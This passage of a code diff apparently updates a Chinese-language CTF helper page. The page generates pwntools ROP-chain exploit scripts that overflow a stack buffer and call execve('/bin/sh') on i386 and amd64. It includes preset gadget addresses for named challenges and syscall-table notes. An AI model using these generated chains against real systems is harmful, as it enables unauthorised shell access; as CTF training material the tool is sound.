+    else s+="\\x"+("0"+b.toString(16)).slice(-2);
+  }
+  return "b'"+s+"'";
+}
+function ropChunkBytes(str,size){ // string -> NUL-terminated, zero-padded chunks of size bytes
+  var raw=[];
+  for(var i=0;i<str.length;i++) raw.push(str.charCodeAt(i)&0xff);
+  raw.push(0);
+  while(raw.length%size) raw.push(0);
+  var out=[];
+  for(var j=0;j<raw.length;j+=size) out.push(raw.slice(j,j+size));
+  return out;
+}
+function ropDelayVal(){ var d=parseFloat(ropV("ropDelay")); return (isFinite(d) && d>=0) ? String(d) : "0.3"; }
+function ropWarnFor(zeros,total,prim){
+  if(prim==="gets") return "输入原语是 gets/strcpy 类：这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00，第一个 \\x00 处就截断，链发不全——改用 read 定长读，或换无 \\x00 的写法。";
+  if(prim==="read-fixed") return "这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00：定长 read 能吃 \\x00，但两次发送仍要间隔（默认 0.3s，见生成代码里的 time.sleep）。";
+  if(prim==="read-stream") return "这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00：循环 read 能吃 \\x00，两次发送仍建议间隔（默认 0.3s）。";
+  return "还没确认输入原语（gets 还是 read、定长还是不定长）：这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00——gets/strcpy 类会在第一个 \\x00 处截断，两次发送在 gets/大定长读下会挂。先确认输入原语再跑，别静默生成。";
+}
+function ropSetPrim(p){
+  ropPrim=p;
+  [["Gets","gets"],["ReadFix","read-fixed"],["ReadStream","read-stream"],["Unknown","unknown"]].forEach(function(kv){
+    var b=$("ropPrim"+kv[0]); if(b) b.classList.toggle("on", p===kv[1]);
+  });
+  ropGen();
+}
 function ropV(id){ var el=$(id); return el ? el.value.trim() : ""; }
 function ropSet(id,v){ var el=$(id); if(el) el.value=v; }
 var ROP_COND={
  "41":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、int 0x80。代表：cmcc_simplerop。思路：链里先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。",
- "42":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、mov [edx],eax、int 0x80；bss_addr 可写。代表：get_started_3dsctf_2016。思路：用 mov 写 gadget 把 \"/bin\" 和 \"/sh\\0\" 两块 4 字节写进 BSS，再 execve。",
- "43":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；目标里已有 /bin/sh 字符串。代表：静态 amd64 题、smallest 变体。默认全 0 是骨架占位，按当前目标重测后填。"
+ "42":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、mov [edx],eax、int 0x80；bss_addr 可写。代表：get_started_3dsctf_2016。思路：用 mov 写 gadget 把字符串按 4 字节分块写进 BSS，再 execve。示例 gadget 地址由用户提供、未验证。",
+ "43":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；目标里已有 /bin/sh 字符串。代表：静态 amd64 题、smallest 变体。默认全 0 是骨架占位，按当前目标重测后填。",
+ "41a":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；可写 BSS。思路：4.1 的 amd64 版——先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。默认全 0 是骨架占位，按当前目标重测后填。",
+ "42a":"条件：amd64；有 pop rax、pop rdi、mov [rdi],rax、pop rsi/rdx + syscall；bss_addr 可写。思路：4.2 的 amd64 版——用 mov 写 gadget 把字符串按 8 字节分块写进 BSS，再 execve。默认全 0 是骨架占位，按当前目标重测后填；若目标没有 mov [rdi],rax，改走 4.1a 的 read 写法。"
 };
 var ROP_FIELDS={
  "41":[["ropOffset","offset_to_ret"],["rop41PopEax","pop_eax_addr"],["rop41Pop3","pop3_addr"],["rop41Int80","int80_addr"],["rop41Bss","bss_addr"],["rop41Len","read 长度"]],
  "42":[["ropOffset","offset_to_ret"],["rop42Binsh","binsh_addr"],["rop42PopEax","pop_eax_addr"],["rop42Pop3","pop3_addr"],["rop42Mov","mov_edx_eax"],["rop42Int80","int80_addr"]],
- "43":[["ropOffset","offset_to_ret"],["rop43PopRax","pop_rax_addr"],["rop43PopRdi","pop_rdi_addr"],["rop43PopRsi","pop_rsi_addr"],["rop43PopRdx","pop_rdx_addr"],["rop43Syscall","syscall_addr"],["rop43Binsh","binsh_addr"]]
+ "43":[["ropOffset","offset_to_ret"],["rop43PopRax","pop_rax_addr"],["rop43PopRdi","pop_rdi_addr"],["rop43PopRsi","pop_rsi_addr"],["rop43PopRdx","pop_rdx_addr"],["rop43Syscall","syscall_addr"],["rop43Binsh","binsh_addr"]],
+ "41a":[["ropOffset","offset_to_ret"],["rop41aPopRax","pop_rax_addr"],["rop41aPopRdi","pop_rdi_addr"],["rop41aPopRsi","pop_rsi_addr"],["rop41aPopRdx","pop_rdx_addr"],["rop41aSyscall","syscall_addr"],["rop41aBss","bss_addr"],["rop41aLen","read 长度"]],
+ "42a":[["ropOffset","offset_to_ret"],["rop42aBinsh","binsh_addr"],["rop42aPopRax","pop_rax_addr"],["rop42aPopRdi","pop_rdi_addr"],["rop42aMov","mov_rdi_rax"],["rop42aPopRsi","pop_rsi_addr"],["rop42aPopRdx","pop_rdx_addr"],["rop42aSyscall","syscall_addr"]]
 };
 function ropGen(){
   var off=ropV("ropOffset")||"0x20", lines=[], steps=[], L;
+  var delay=ropDelayVal();
   if(ropTpl==="41"){
     var pe=ropV("rop41PopEax"), p3=ropV("rop41Pop3"), i8=ropV("rop41Int80"), bss=ropV("rop41Bss"), len=ropV("rop41Len")||"0x100";
+    var vals41=[pe,3,p3,len,bss,0,i8, pe,11,p3,0,0,bss,i8];
+    var z41=ropZerosVals(vals41);
+    var offN=parseNum(off), total41=(offN!==null ? offN : 0)+vals41.length*4;
     lines=[
       "# 4.1 i386 int 0x80：read → BSS → execve（cmcc_simplerop 型）",
       "from pwn import *",
+      "import time",
       "context.arch = 'i386'",
       "io = process('./prog')  # TODO: 改成你的目标",
       "",
@@ -1740,47 +1891,142 @@ function ropGen(){
       "# 第一段 read(0, bss, "+len+")：eax=3，edx="+len+"，ecx=bss，ebx=0",
       "# 第二段 execve(bss, 0, 0)：eax=11，edx=0，ecx=0，ebx=bss",
       "# 注意 pop3 弹出顺序是 edx, ecx, ebx，所以 flat 里 pop3 后面按 edx, ecx, ebx 的值排",
+      "# \\x00 警告：这条链共 "+total41+" 字节，含 "+z41+" 个 \\x00（调用号 3/11、长度、0 参数都会带 \\x00）；gets/strcpy 类输入会在第一个 \\x00 处截断",
+      "# 没有 pop3？见下方“单个 pop 回退”：逐个 pop 设寄存器，别硬套 pop3 模板",
       "chain = flat(b'A'*offset_to_ret, pop_eax_addr, 3, pop3_addr, "+len+", bss_addr, 0, int80_addr,",
       "             pop_eax_addr, 11, pop3_addr, 0, 0, bss_addr, int80_addr)",
       "io.send(chain)                 # 先发链",
+      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：gets/大定长读下连续发会挂，先等读端把链消费掉，不够再调大",
       "io.send(b'/bin/sh\\x00')          # 链里的 read 会把这一行读进 bss",
       "io.interactive()"
     ];
     steps=[
       ["步骤 1 · read(0, bss, "+len+")","eax=3 · ebx=0 (fd=stdin) · ecx="+bss+" (buf=bss) · edx="+len+" (count)　|　pop3 段按 edx,ecx,ebx 填："+len+", "+bss+", 0"],
       ["步骤 2 · execve(bss, 0, 0)","eax=11 · ebx="+bss+" (path) · ecx=0 (argv) · edx=0 (envp)　|　pop3 段按 edx,ecx,ebx 填：0, 0, "+bss],
-      ["发送顺序","先 io.send(chain)，再 io.send(b'/bin/sh\\0')——链跑到 read 时才从输入里取字符串，顺序反了读不到"]
+      ["发送顺序","先 io.send(chain)，等 "+delay+"s，再 io.send(b'/bin/sh\\0')——链跑到 read 时才从输入里取字符串，顺序反了读不到；连续发在 gets/大定长读下会挂"],
+      ["\\x00 统计","链共 "+total41+" 字节，含 "+z41+" 个 \\x00（主要来自调用号 3、11 和 0 参数）"]
     ];
+    L={zeros:z41,total:total41};
   }else if(ropTpl==="42"){
     var bs=ropV("rop42Binsh"), pe2=ropV("rop42PopEax"), p32=ropV("rop42Pop3"), mv=ropV("rop42Mov"), i82=ropV("rop42Int80");
-    var bn=parseNum(bs), bs4=(bn!==null ? "0x"+(bn+4).toString(16) : "binsh_addr+4");
+    var str42=ropV("rop42Str")||"/bin/sh";
+    var chunks42=ropChunkBytes(str42, 4);
+    var bn=parseNum(bs);
+    var vals42=[];
+    chunks42.forEach(function(c,k){ var cv=(c[0]|(c[1]<<8)|(c[2]<<16)|(c[3]<<24))>>>0; vals42.push(pe2, cv, p32, bs, 0, 0, mv); });
+    vals42.push(pe2, 11, p32, 0, 0, bs, i82);
+    var z42=0; vals42.forEach(function(v){ z42+=ropZerosU32(typeof v==="number" ? v : parseNum(String(v))); });
+    var offN42=parseNum(off), total42=(offN42!==null ? offN42 : 0)+vals42.length*4;
     lines=[
-      "# 4.2 i386：写 /bin/sh 到 BSS 再 execve（get_started_3dsctf_2016 型）",
+      "# 4.2 i386：写字符串到 BSS 再 execve（get_started_3dsctf_2016 型）",
+      "# 示例 gadget 地址由用户提供、未验证",
       "from pwn import *",
       "context.arch = 'i386'",
       "io = process('./prog')  # TODO: 改成你的目标",
       "",
       "offset_to_ret = "+off+"            # 输入起点 → saved RIP 的填充数",
-      "binsh_addr = "+bs+"       # 写入 /bin/sh 的可写 BSS 地址",
+      "binsh_addr = "+bs+"       # 写入字符串的可写 BSS 地址",
       "pop_eax_addr = "+pe2+"     # pop eax; ret",
       "pop3_addr = "+p32+"        # pop edx; pop ecx; pop ebx; ret",
       "mov_edx_eax = "+mv+"      # mov dword ptr [edx], eax; ret",
       "int80_addr = "+i82+"       # int 0x80; ret",
       "",
       "p = b'A'*offset_to_ret",
-      "# 写 \"/bin\" 到 binsh_addr：eax=\"/bin\"，edx=binsh_addr，mov [edx],eax",
-      "p += flat(pop_eax_addr, u32(b'/bin')) + flat(pop3_addr, binsh_addr, 0, 0, mov_edx_eax)",
-      "# 写 \"/sh\\0\" 到 binsh_addr+4（= "+bs4+"）",
-      "p += flat(pop_eax_addr, u32(b'/sh\\x00')) + flat(pop3_addr, binsh_addr+4, 0, 0, mov_edx_eax)",
-      "# execve(binsh_addr, 0, 0)：eax=11，ebx=binsh_addr，ecx=edx=0（pop3 段按 edx,ecx,ebx 填：0, 0, binsh_addr）",
-      "p += flat(pop_eax_addr, 11) + flat(pop3_addr, 0, 0, binsh_addr, int80_addr)",
-      "io.sendline(p); io.interactive()"
+      "# 写 \""+str42+"\"（"+(str42.length+1)+" 字节含结尾 \\x00，自动按 4 字节分块，共 "+chunks42.length+" 块）",
+      "# \\x00 警告：这条链共 "+total42+" 字节，含 "+z42+" 个 \\x00；gets/strcpy 类输入会在第一个 \\x00 处截断",
+      "# 没有 pop3？见下方“单个 pop 回退”：逐个 pop 设寄存器，别硬套 pop3 模板"
+    ];
+    chunks42.forEach(function(c,k){
+      var addr=(bn!==null ? "0x"+(bn+4*k).toString(16) : "binsh_addr+"+(4*k));
+      var addrVar=(k===0 ? "binsh_addr" : "binsh_addr+"+(4*k));
+      lines.push("# 写块 "+(k+1)+"/"+chunks42.length+"："+ropPyBytes(c)+" → "+addr+"（第 "+(k+1)+" 块地址 = binsh+"+(4*k)+"）");
+      lines.push("p += flat(pop_eax_addr, u32("+ropPyBytes(c)+")) + flat(pop3_addr, "+addrVar+", 0, 0, mov_edx_eax)");
+    });
+    lines.push("# execve(binsh_addr, 0, 0)：eax=11，ebx=binsh_addr，ecx=edx=0（pop3 段按 edx,ecx,ebx 填：0, 0, binsh_addr）");
+    lines.push("p += flat(pop_eax_addr, 11) + flat(pop3_addr, 0, 0, binsh_addr, int80_addr)");
+    lines.push("io.sendline(p); io.interactive()");
+    steps=chunks42.map(function(c,k){
+      var addr=(bn!==null ? "0x"+(bn+4*k).toString(16) : "binsh_addr+"+(4*k));
+      return ["写块 "+(k+1)+"/"+chunks42.length+" · "+ropPyBytes(c)+" → "+addr,"eax=u32("+ropPyBytes(c)+") · edx="+addr+" · 执行 mov [edx], eax　|　pop3 段："+addr+", 0, 0，后接 mov_edx_eax"];
+    });
+    steps.push(["最后 · execve(binsh, 0, 0)","eax=11 · ebx="+bs+" · ecx=0 · edx=0　|　pop3 段按 edx,ecx,ebx 填：0, 0, "+bs+"，后接 int80_addr"]);
+    steps.push(["\\x00 统计","链共 "+total42+" 字节，含 "+z42+" 个 \\x00"]);
+    L={zeros:z42,total:total42};
+  }else if(ropTpl==="41a"){
+    var pra=ropV("rop41aPopRax"), prdi=ropV("rop41aPopRdi"), prsi=ropV("rop41aPopRsi"), prdx=ropV("rop41aPopRdx"), sca=ropV("rop41aSyscall"), bsa=ropV("rop41aBss"), lena=ropV("rop41aLen")||"0x100";
+    lines=[
+      "# 4.1a amd64 syscall：read → BSS → execve（4.1 的 amd64 版）",
+      "# SKELETON：0 是占位地址，没有实测参数；按当前目标重测后填",
+      "from pwn import *",
+      "import time",
+      "context.arch = 'amd64'",
+      "io = process('./prog')  # TODO: 改成你的目标",
+      "",
+      "offset_to_ret = "+off+"          # 输入起点 → saved RIP 的填充数",
+      "pop_rax_addr = "+pra+"              # pop rax; ret",
+      "pop_rdi_addr = "+prdi+"              # pop rdi; ret",
+      "pop_rsi_addr = "+prsi+"              # pop rsi; ret",
+      "pop_rdx_addr = "+prdx+"              # pop rdx; ret",
+      "syscall_addr = "+sca+"              # syscall; ret",
+      "bss_addr = "+bsa+"          # 可写 BSS，第二次 read 和 /bin/sh 放这里",
+      "",
+      "# 第一段 read(0, bss, "+lena+")：rax=0，rdi=0，rsi=bss，rdx="+lena,
+      "# 第二段 execve(bss, 0, 0)：rax=59，rdi=bss，rsi=0，rdx=0",
+      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；gets/strcpy 类输入会在第一个 \\x00 处截断",
+      "chain = flat(b'A'*offset_to_ret, pop_rax_addr, 0, pop_rdi_addr, 0, pop_rsi_addr, bss_addr, pop_rdx_addr, "+lena+", syscall_addr,",
+      "             pop_rax_addr, 59, pop_rdi_addr, bss_addr, pop_rsi_addr, 0, pop_rdx_addr, 0, syscall_addr)",
+      "io.send(chain)                 # 先发链",
+      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：gets/大定长读下连续发会挂，先等读端把链消费掉，不够再调大",
+      "io.send(b'/bin/sh\\x00')          # 链里的 read 会把这一行读进 bss",
+      "io.interactive()"
     ];
     steps=[
-      ["写 1 · \"/bin\" → "+bs,"eax=u32(\"/bin\") · edx="+bs+" · 执行 mov [edx], eax　|　pop3 段："+bs+", 0, 0，后接 mov_edx_eax"],
-      ["写 2 · \"/sh\\0\" → "+bs4,"eax=u32(\"/sh\\0\") · edx="+bs4+" · 执行 mov [edx], eax　|　第二块地址 = binsh+4，别写回原地址覆盖第一块"],
-      ["步骤 3 · execve(binsh, 0, 0)","eax=11 · ebx="+bs+" · ecx=0 · edx=0　|　pop3 段按 edx,ecx,ebx 填：0, 0, "+bs+"，后接 int80_addr"]
+      ["步骤 1 · read(0, bss, "+lena+")","rax=0 · rdi=0 (fd=stdin) · rsi="+bsa+" (buf=bss) · rdx="+lena+" (count)"],
+      ["步骤 2 · execve(bss, 0, 0)","rax=59 (amd64 execve 号) · rdi="+bsa+" (path) · rsi=0 (argv) · rdx=0 (envp)"],
+      ["发送顺序","先 io.send(chain)，等 "+delay+"s，再 io.send(b'/bin/sh\\0')——连续发在 gets/大定长读下会挂"]
     ];
+    L={zeros:null,total:null};
+  }else if(ropTpl==="42a"){
+    var bsa2=ropV("rop42aBinsh"), pra2=ropV("rop42aPopRax"), prdi2=ropV("rop42aPopRdi"), mv2=ropV("rop42aMov"), prsi2=ropV("rop42aPopRsi"), prdx2=ropV("rop42aPopRdx"), sc2=ropV("rop42aSyscall");
+    var str42a=ropV("rop42Str")||"/bin/sh";
+    var chunks42a=ropChunkBytes(str42a, 8);
+    var bn2=parseNum(bsa2);
+    lines=[
+      "# 4.2a amd64：写字符串到 BSS 再 execve（4.2 的 amd64 版）",
+      "# SKELETON：0 是占位地址，没有实测参数；按当前目标重测后填",
+      "from pwn import *",
+      "context.arch = 'amd64'",
+      "io = process('./prog')  # TODO: 改成你的目标",
+      "",
+      "offset_to_ret = "+off+"            # 输入起点 → saved RIP 的填充数",
+      "binsh_addr = "+bsa2+"       # 写入字符串的可写 BSS 地址",
+      "pop_rax_addr = "+pra2+"     # pop rax; ret",
+      "pop_rdi_addr = "+prdi2+"     # pop rdi; ret",
+      "mov_rdi_rax = "+mv2+"      # mov qword ptr [rdi], rax; ret（若目标没有，改走 4.1a 的 read 写法）",
+      "pop_rsi_addr = "+prsi2+"     # pop rsi; ret",
+      "pop_rdx_addr = "+prdx2+"     # pop rdx; ret",
+      "syscall_addr = "+sc2+"      # syscall; ret",
+      "",
+      "p = b'A'*offset_to_ret",
+      "# 写 \""+str42a+"\"（"+(str42a.length+1)+" 字节含结尾 \\x00，自动按 8 字节分块，共 "+chunks42a.length+" 块）",
+      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；gets/strcpy 类输入会在第一个 \\x00 处截断"
+    ];
+    chunks42a.forEach(function(c,k){
+      var addr=(bn2!==null ? "0x"+(bn2+8*k).toString(16) : "binsh_addr+"+(8*k));
+      var addrVar=(k===0 ? "binsh_addr" : "binsh_addr+"+(8*k));
+      lines.push("# 写块 "+(k+1)+"/"+chunks42a.length+"："+ropPyBytes(c)+" → "+addr+"（第 "+(k+1)+" 块地址 = binsh+"+(8*k)+"）");
+      lines.push("p += flat(pop_rax_addr, u64("+ropPyBytes(c)+")) + flat(pop_rdi_addr, "+addrVar+", mov_rdi_rax)");
+    });
+    lines.push("# execve(binsh_addr, 0, 0)：rax=59，rdi=binsh_addr，rsi=rdx=0");
+    lines.push("p += flat(pop_rax_addr, 59) + flat(pop_rdi_addr, binsh_addr, pop_rsi_addr, 0, pop_rdx_addr, 0, syscall_addr)");
+    lines.push("io.sendline(p); io.interactive()");
+    steps=chunks42a.map(function(c,k){
+      var addr=(bn2!==null ? "0x"+(bn2+8*k).toString(16) : "binsh_addr+"+(8*k));
+      return ["写块 "+(k+1)+"/"+chunks42a.length+" · "+ropPyBytes(c)+" → "+addr,"rax=u64("+ropPyBytes(c)+") · rdi="+addr+" · 执行 mov [rdi], rax"];
+    });
+    steps.push(["最后 · execve(binsh, 0, 0)","rax=59 · rdi="+bsa2+" · rsi=0 · rdx=0"]);
+    L={zeros:null,total:null};
+
   }else{
     var pra=ropV("rop43PopRax"), prdi=ropV("rop43PopRdi"), prsi=ropV("rop43PopRsi"), prdx=ropV("rop43PopRdx"), sc=ropV("rop43Syscall"), bsh=ropV("rop43Binsh");
     lines=[
@@ -1817,21 +2063,34 @@ function ropGen(){
   var w=$("ropWarn"), msgs=[];
   if(empty.length) msgs.push("还没填："+empty.join("、")+"——生成的链里对应位置是空的，先用 ROPgadget 量出来再填。");
   if(zeros.length) msgs.push("还是 0 占位："+zeros.join("、")+"——0 地址一跳就崩，按当前目标重测后填真实地址。");
+  if(L && L.zeros!==null) msgs.push(ropWarnFor(L.zeros, L.total, ropPrim));
+  else if(ropPrim==="unknown") msgs.push("还没确认输入原语（gets 还是 read、定长还是不定长）：链含 \\x00、两次发送有时序要求，没这个信息就别静默跑，先确认。");
+  else if(ropPrim==="gets") msgs.push("输入原语是 gets/strcpy 类：链含 \\x00 时第一个 \\x00 处就截断，链发不全——改用 read 定长读，或换无 \\x00 的写法。");
   if(msgs.length){ w.innerHTML=msgs.join("<br>"); w.classList.add("show"); } else { w.innerHTML=""; w.classList.remove("show"); }
+  var pn=$("ropPrimNote");
+  if(pn) pn.textContent = ropPrim==="unknown"
+    ? "没确认输入原语：不知道是 gets 还是 read、定长还是不定长，生成的链可能含 \\x00、两次发送可能有时序问题，先确认再跑。"
+    : ropPrim==="gets" ? "输入原语是 gets/strcpy 类：链含 \\x00 会在第一个 \\x00 处截断；两次发送也要间隔。"
+    : "输入原语已确认：定长/循环 read 能吃 \\x00，两次发送仍要间隔（默认 0.3s）。";
 }
 function ropSetTpl(t){
   ropTpl=t;
-  $("ropT41").classList.toggle("on", t==="41");
-  $("ropT42").classList.toggle("on", t==="42");
-  $("ropT43").classList.toggle("on", t==="43");
-  $("ropG41").style.display = t==="41" ? "" : "none";
-  $("ropG42").style.display = t==="42" ? "" : "none";
-  $("ropG43").style.display = t==="43" ? "" : "none";
+  ["41","42","43","41a","42a"].forEach(function(k){
+    var b=$( "ropT"+k), g=$("ropG"+k);
+    if(b) b.classList.toggle("on", t===k);
+    if(g) g.style.display = t===k ? "" : "none";
+  });
   ropGen();
 }
 $("ropT41").addEventListener("click",function(){ropSetTpl("41");});
 $("ropT42").addEventListener("click",function(){ropSetTpl("42");});
 $("ropT43").addEventListener("click",function(){ropSetTpl("43");});
+$("ropT41a").addEventListener("click",function(){ropSetTpl("41a");});
+$("ropT42a").addEventListener("click",function(){ropSetTpl("42a");});
+$("ropPrimGets").addEventListener("click",function(){ropSetPrim("gets");});
+$("ropPrimReadFix").addEventListener("click",function(){ropSetPrim("read-fixed");});
+$("ropPrimReadStream").addEventListener("click",function(){ropSetPrim("read-stream");});
+$("ropPrimUnknown").addEventListener("click",function(){ropSetPrim("unknown");});
 document.querySelectorAll(".rop-input").forEach(function(inp){ inp.addEventListener("input", ropGen); });
 $("ropPreset41").addEventListener("click",function(){
   ropSet("ropOffset","0x20"); ropSet("rop41PopEax","0x80bae06"); ropSet("rop41Pop3","0x806e850"); ropSet("rop41Int80","0x806eef0"); ropSet("rop41Bss","0x80eaf80"); ropSet("rop41Len","0x100");
@@ -1839,11 +2098,19 @@ $("ropPreset41").addEventListener("click",function(){
 });
 $("ropPreset42").addEventListener("click",function(){
   ropSet("ropOffset","56"); ropSet("rop42Binsh","0x080eb050"); ropSet("rop42PopEax","0x080b91e6"); ropSet("rop42Pop3","0x0806fc30"); ropSet("rop42Mov","0x080557ab"); ropSet("rop42Int80","0x0806d7e5");
-  ropSetTpl("42"); toast("已填入 4.2 示例参数（get_started_3dsctf_2016）");
+  ropSetTpl("42"); toast("已填入 4.2 示例参数（get_started_3dsctf_2016；地址由用户提供、未验证）");
 });
 $("ropPreset43").addEventListener("click",function(){
   ropSet("ropOffset","0x20"); ropSet("rop43PopRax","0"); ropSet("rop43PopRdi","0"); ropSet("rop43PopRsi","0"); ropSet("rop43PopRdx","0"); ropSet("rop43Syscall","0"); ropSet("rop43Binsh","0");
   ropSetTpl("43"); toast("4.3 已清成 0 骨架，按目标重测后填");
+});
+$("ropPreset41a").addEventListener("click",function(){
+  ropSet("ropOffset","0x20"); ropSet("rop41aPopRax","0"); ropSet("rop41aPopRdi","0"); ropSet("rop41aPopRsi","0"); ropSet("rop41aPopRdx","0"); ropSet("rop41aSyscall","0"); ropSet("rop41aBss","0"); ropSet("rop41aLen","0x100");
+  ropSetTpl("41a"); toast("4.1a 已清成 0 骨架，按目标重测后填");
+});
+$("ropPreset42a").addEventListener("click",function(){
+  ropSet("ropOffset","56"); ropSet("rop42aBinsh","0"); ropSet("rop42aPopRax","0"); ropSet("rop42aPopRdi","0"); ropSet("rop42aMov","0"); ropSet("rop42aPopRsi","0"); ropSet("rop42aPopRdx","0"); ropSet("rop42aSyscall","0");
+  ropSetTpl("42a"); toast("4.2a 已清成 0 骨架，按目标重测后填");
 });
 $("ropCopyBtn").addEventListener("click",function(){ copyText($("ropCode").textContent,"已复制 ROP 链代码"); });
 ropGen();
@@ -1861,11 +2128,11 @@ function setArch(a){
   document.querySelectorAll(".cgArch").forEach(function(el){el.textContent=a;});
   if(a==="i386"){
     $("subLine").innerHTML="i386 系统调用表 → <code>shellcraft.i386.linux.syscall(...)</code>，走 <code>int 0x80</code>。顺序：<code>eax=NR, ebx, ecx, edx, esi, edi, ebp</code>，调用号和 amd64 完全不同（如 read=3, write=4, open=5, execve=11）。i386 没有 mmap，只有 <code>mmap2</code>(192，最后一个参数 pgoff 单位是页)；老内核 socket 类调用走 socketcall(102) 多路复用。";
-    $("tableNote").textContent="i386 表共 "+SYS32.length+" 条：NR 0\u2013386 段已按 i386 调用号逐条补齐核对（含 socketcall=102、ipc=117、select=142、poll=168、mmap2=192、truncate64/sendfile64、set_thread_area=243、359\u2013373 的 socket 独立调用、393\u2013402 的 SysV IPC 独立调用、403–423 的 time64 系列（32 位专用，如 clock_gettime64/futex_time64，415 除外）；少数历史废弃号如 break/oldstat 未收录，285、387–392、415 是未分配空号），NR 424 起为与 x64 共用的新调用、参数签名按同名 x64 调用复用，这一段使用前建议再用 man 确认。找不到就换英文名再试；切回 amd64 看完整表。";
-    var n32=$("i386Note"); if(n32){ n32.innerHTML="<b>i386 已核对的易错点：</b>① socketcall(102) 是多路复用入口，子调用号 SYS_SOCKET=1 / BIND=2 / CONNECT=3 / LISTEN=4 / ACCEPT=5，第二个参数是指向参数数组的指针；新内核（4.3+）另有独立的 socket(359)/bind(361)/connect(362) 等号，可直接搜名字。② mmap2(192) 的最后一个参数 pgoff 单位是<b>页</b>（0x1000 字节），不是字节。③ ipc(117) 是 SysV IPC 多路复用入口（semget/msgget/shmget 走它），新内核也有独立号 393\u2013402。④ clone 的参数顺序和 amd64 不同：i386 是 flags / newsp / parent_tidptr / <b>tls / child_tidptr</b>（tls 第 4、child_tidptr 第 5，后两个和 amd64 反着——amd64 是 child_tidptr 第 4、tls 第 5），本页已按 i386 顺序收录。⑤ 同名 uid/gid 调用按名查找返回的是 *32 版号：getuid=199、getgid=200、geteuid=201、getegid=202、setuid=213、setgid=214（旧 16 位版号已从表里去掉，免得搜 getuid 跳出 24）。其余 i386 专属号（0\u2013386）已按 i386 表逐条核对，424 起共用号见上方说明。⑥ 403–423 是 32 位专用的 time64 系列（415 除外）（解决 2038 年问题的 64 位时间版）：参数顺序和同名普通版一样，只是时间结构体是 64 位的，搜 clock_gettime64 / futex_time64 / utimensat_time64 能直接找到；285、387–392、415 是未分配空号，没有对应调用。"; n32.classList.add("show"); }
+    $("tableNote").textContent="i386 表共 "+SYS32.length+" 条：NR 0\u2013386 段收录现代常用号，31 个历史号未收录（19 个无实现、12 个旧 ABI：oldstat/oldfstat/signal/sgetmask/ssetmask/uselib 等）（含 socketcall=102、ipc=117、select=142、poll=168、mmap2=192、truncate64/sendfile64、set_thread_area=243、359\u2013373 的 socket 独立调用、393\u2013402 的 SysV IPC 独立调用、403–423 的 time64 系列（32 位专用，如 clock_gettime64/futex_time64，415 除外），222、223、251、285、387–392、415 是未分配空号（共 11 个）；149 _sysctl、253 lookup_dcookie 有名无实现、调用只会返回 -ENOSYS，也未收录），NR 424 起为与 x64 共用的新调用、参数签名按同名 x64 调用复用，这一段使用前建议再用 man 确认。找不到就换英文名再试；切回 amd64 看完整表。";
+    var n32=$("i386Note"); if(n32){ n32.innerHTML="<b>i386 已核对的易错点：</b>① socketcall(102) 是多路复用入口，子调用号 SYS_SOCKET=1 / BIND=2 / CONNECT=3 / LISTEN=4 / ACCEPT=5，第二个参数是指向参数数组的指针；新内核（4.3+）另有独立的 socket(359)/bind(361)/connect(362) 等号，可直接搜名字。② mmap2(192) 的最后一个参数 pgoff 单位是<b>页</b>（0x1000 字节），不是字节。③ ipc(117) 是 SysV IPC 多路复用入口（semget/msgget/shmget 走它），新内核也有独立号 393\u2013402。④ clone 的参数顺序和 amd64 不同：i386 是 flags / newsp / parent_tidptr / <b>tls / child_tidptr</b>（tls 第 4、child_tidptr 第 5，后两个和 amd64 反着——amd64 是 child_tidptr 第 4、tls 第 5），本页已按 i386 顺序收录。⑤ 同名 uid/gid 调用按名查找返回的是 *32 版号：getuid=199、getgid=200、geteuid=201、getegid=202、setuid=213、setgid=214（旧 16 位版号已从表里去掉，免得搜 getuid 跳出 24）。其余 i386 专属号（0\u2013386）已按 i386 表逐条核对，424 起共用号见上方说明。⑥ 403–423 是 32 位专用的 time64 系列（415 除外）（解决 2038 年问题的 64 位时间版）：参数顺序和同名普通版一样，只是时间结构体是 64 位的，搜 clock_gettime64 / futex_time64 / utimensat_time64 能直接找到；222、223、251、285、387–392、415 是未分配空号（共 11 个），没有对应调用。"; n32.classList.add("show"); }
   }else{
     $("subLine").innerHTML="x64 系统调用表 → <code>shellcraft.amd64.linux.syscall(...)</code>。顺序固定：<code>rax=NR, rdi, rsi, rdx, r10, r8, r9</code>（第 4 个参数是 r10，不是 rcx）。";
-    $("tableNote").textContent="已按 x86-64 调用号表复核：补上了原表漏掉的 set_thread_area(205)、get_thread_area(211)（lookup_dcookie 212 之前已补）。没收录的号分两类：①未分配空号只有 337–423（共 87 个）；②有名无实现、调用只会返回 -ENOSYS 的 14 个：134 uselib、156 _sysctl、174 create_module、177 get_kernel_syms、178 query_module、180 nfsservctl、181 getpmsg、182 putpmsg、183 afs_syscall、184 tuxcall、185 security、214 epoll_ctl_old、215 epoll_wait_old、236 vserver。注意 175=init_module、176=delete_module、179=quotactl 是真实可用的调用，335=uretprobe、336=uprobe 也是真实存在的新调用，都不是空号。找不到就换英文名再试。";
